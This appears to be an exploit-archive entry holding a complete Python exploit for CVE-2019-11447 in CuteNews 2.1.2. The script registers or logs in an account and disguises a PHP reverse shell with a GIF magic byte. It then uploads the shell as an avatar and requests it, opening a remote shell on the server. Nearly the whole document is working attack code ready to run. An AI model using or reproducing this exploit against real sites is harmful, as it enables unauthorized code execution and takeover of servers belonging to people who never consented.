@@ -1,0 +1,181 @@
+id: 35977
+date: 03/18/2021
+title: CuteNews 2.1.2 Shell Upload Exploit
+author: Mayank Deshmukh
+cves: CVE-2019-11447
+
+#! /usr/bin/env python3
+
+## Exploit Title: CuteNews 2.1.2 - Avatar upload RCE (Authenticated)
+## Exploit Author: Mayank Deshmukh
+## Date: 2021-03-17
+## Vendor Homepage: https://cutephp.com/
+## Software Link: https://cutephp.com/click.php?cutenews_latest
+## Version: 2.1.2
+## CVE: CVE-2019-11447
+## CVE Reference: https://nvd.nist.gov/vuln/detail/CVE-2019-11447
+## Tested on: Kali GNU/Linux 2020.3
+## Author website: https://coldfusionx.github.io
+## Author email: coldfusionx@outlook.com
+## Detailed POC: https://github.com/ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE
+
+import requests
+import sys
+import re
+import argparse, textwrap
+
+#Expected Arguments
+parser = argparse.ArgumentParser(description="CuteNews 2.1.2 - Avatar upload RCE (Authenticated) by ColdFusionX", formatter_class=argparse.RawTextHelpFormatter, 
+epilog=textwrap.dedent(''' 
+
+Exploit Usage : 
+./exploit.py -l http://127.0.0.1 -u cold -p fusion -e cold@decepticon.net
+./exploit.py -l http://127.0.0.1 -u optimus -p prime -e optimus@autobots.net
+[^] Select your PHP file -> rev.php
+OR
+[^] Select your PHP file -> ~/Downloads/rev.php
+[^] Press y/n to trigger reverse shell -> y
+
+'''))                     
+
+parser.add_argument("-l","--url", help="CuteNews URL (Example: http://127.0.0.1)") 
+parser.add_argument("-u","--username", help="Username to Login/Register") 
+parser.add_argument("-p","--password", help="Password to Login/Register")
+parser.add_argument("-e","--email", help="Email to Login/Register")    
+args = parser.parse_args()
+
+if len(sys.argv) <= 8:
+    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [username] -p [password] -e [email ID]")          
+    sys.exit()  
+
+# Variables
+Host = args.url
+Username = args.username
+Password = args.password
+Email = args.email
+
+r = requests.session()
+
+## Use this for Proxy
+#r.proxies.update( { 'http':'http://127.0.0.1:8080' } ) 
+
+# Login check
+def login():
+    init = r.get(f"{Host}/CuteNews/index.php")
+    cookie = init.cookies.get('CUTENEWS_SESSION')
+
+    headerscontent = {
+            'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+                     }
+    cookie = {
+            'CUTENEWS_SESSION':cookie
+              }
+
+    postcontent = {
+            'action' : 'dologin',
+            'username' : f"{Username}",
+            'password' : f"{Password}",
+                  }
+    
+    login = r.post(f'{Host}/CuteNews/index.php', data = postcontent, cookies= cookie, headers = headerscontent, allow_redirects= False)
+    
+    if 302 == login.status_code:
+        print (f"[+] User exists ! Logged in Successfully")
+        return True
+
+# Registering User
+def register():
+
+    headerscontent = {
+            'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+                     }
+    postcontent = {
+            'action' : 'register',
+            'regusername' : f"{Username}",
+            'regnickname' : f"{Username}",
+            'regpassword' : f"{Password}",
+            'confirm' : f"{Password}",
+            'regemail' : f"{Email}"
+                  }
+
+    registration = r.post(f'{Host}/CuteNews/index.php?register', data = postcontent, headers = headerscontent, allow_redirects= False)
+    
+    if 302 == registration.status_code:
+        print (f"[+] Credentials {Username}:{Password} Successfully Registered")
+    else:
+        sys.exit()
+
+# Avatar upload    
+def upload():
+
+    keys = r.get(f"{Host}/CuteNews/index.php?mod=main&opt=personal")
+    signature_key = re.search('signature_key" value="(.*?)"', keys.text).group(1)
+    signature_dsi = re.search('signature_dsi" value="(.*?)"', keys.text).group(1)
+
+# Grab PHP reverse shell from : https://github.com/pentestmonkey/php-reverse-shell    
+    MalFile = input("[^] Select your PHP file -> ")
+
+# Adding Magic Byte to PHP file
+
+    with open(MalFile, 'r') as original: data = original.read()
+    print()
+    print ("[*] Adding Magic Byte to PHP file")
+    with open(MalFile, 'w') as modified: modified.write("GIF8;\n" + data)
+
+    Efile = open(MalFile, 'rb')
+
+    headerscontent = {
+            'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+                     }
+    files = {
+        "mod" : (None, "main"),
+        "opt" : (None, "personal"),
+        "__signature_key" : (None, f"{signature_key}"),
+        "__signature_dsi" : (None, f"{signature_dsi}"),
+        "editpassword" : (None, ""),
+        "confirmpassword" : (None, ""),
+        "editnickname" : (None,Username),
+        "avatar_file" : (f"{Username}.php", Efile ) ,
+        "more[site]" : (None, ""),      
+        "more[about]" : (None, "")
+    }
+    shell_upload = r.post(f"{Host}/CuteNews/index.php", headers = headerscontent, files = files)
+
+# Removing Magic Byte from PHP file 
+    with open(MalFile,"r+") as f:
+        new_f = f.readlines()
+        f.seek(0)
+        for line in new_f:
+            if "GIF8;" not in line:
+                f.write(line)
+        f.truncate()
+
+    if 'User info updated!' in shell_upload.text:
+        print ("[+] Upload Successful !!")
+        print (f"[*] File location --> {Host}/CuteNews/uploads/avatar_{Username}_{Username}.php")
+        print ()
+        
+        Trig = input("[^] Press y/n to trigger PHP file -> ")
+        if Trig == 'y':
+            print ("[*] Check listener for reverse shell") 
+            shell = r.get(f"{Host}/CuteNews/uploads/avatar_{Username}_{Username}.php")                     
+        else:
+            print ("[*] Execution Completed") 
+            sys.exit()
+    elif 'Error: avatar is not correct' in shell_upload.text:
+        print ()
+        print ("[*] Uploading Failed ! Try again")
+    else:
+        sys.exit()
+
+if __name__ == "__main__":
+    
+    print ('[+] CuteNews 2.1.2 - Avatar Upload RCE exploit by ColdFusionX \n ')
+    if login() == True:
+        upload()
+    else:
+        register()
+        upload()
+    print ("[*] Execution Completed")
+
+#  0day.today [2023-03-24]  #
